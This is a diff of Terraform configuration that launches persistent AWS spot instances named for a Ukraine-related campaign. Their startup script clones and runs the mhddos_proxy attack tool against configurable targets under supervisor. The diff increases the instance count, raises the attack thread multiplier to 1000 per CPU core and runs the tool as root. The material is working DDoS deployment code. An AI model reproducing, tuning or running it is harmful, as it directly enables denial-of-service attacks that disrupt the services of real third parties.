@@ -42,10 +42,10 @@ resource "aws_security_group" "slava_ukraine_sg" {
 }
 
 resource "aws_spot_instance_request" "slava_ukraine" {
-  count                          = 2
+  count                          = 3
   ami                            = var.ami
   spot_type                      = "persistent"
-  spot_price                     = "0.0019"
+  spot_price                     = "0.0018"
   instance_type                  = "t3.nano"
   instance_interruption_behavior = "terminate"
   vpc_security_group_ids         = [aws_security_group.slava_ukraine_sg.id]
@@ -65,7 +65,7 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 pip3 install -r mhddos_proxy/requirements.txt
 sudo touch /etc/supervisor/conf.d/ddos.conf
 sudo chmod 777 /etc/supervisor/conf.d/ddos.conf
-echo -e "[program:piZddos]\ncommand=/usr/bin/python3 `pwd`/mhddos_proxy/runner.py -t $((`nproc` *300))  ${var.targets}\nautostart=true\nautorestart=true\nstdout_logfile=/var/log/piZddos.out.log" > /etc/supervisor/conf.d/ddos.conf
+echo -e "[program:piZddos]\ncommand=/usr/bin/python3 `pwd`/mhddos_proxy/runner.py -t $((`nproc` *1000))  ${var.targets}\nuser=root\nautostart=true\nautorestart=true\nstdout_logfile=/var/log/piZddos.log\nstderr_logfile=/var/log/piZddos.err.log\n" > /etc/supervisor/conf.d/ddos.conf
 sudo supervisorctl reread
 sudo supervisorctl update
 EOF
